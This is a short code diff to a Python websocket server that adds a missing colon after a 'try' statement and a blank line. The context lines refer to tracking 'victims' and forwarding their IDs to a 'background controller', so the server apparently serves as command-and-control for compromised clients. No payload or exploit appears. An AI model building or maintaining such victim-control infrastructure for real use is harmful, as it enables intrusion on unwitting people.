@@ -21,7 +21,7 @@ async def handler(websocket):
     if first_msg.find("ROLE:BACKROUND")!=-1:
         global background_controller
         background_controller=websocket
-        try
+        try:
             for vid in victims.keys():
                 if background_controller is not None:
                     await background_controller.send(f"EXISTING_VICTIM:{vid}")
@@ -115,5 +115,6 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
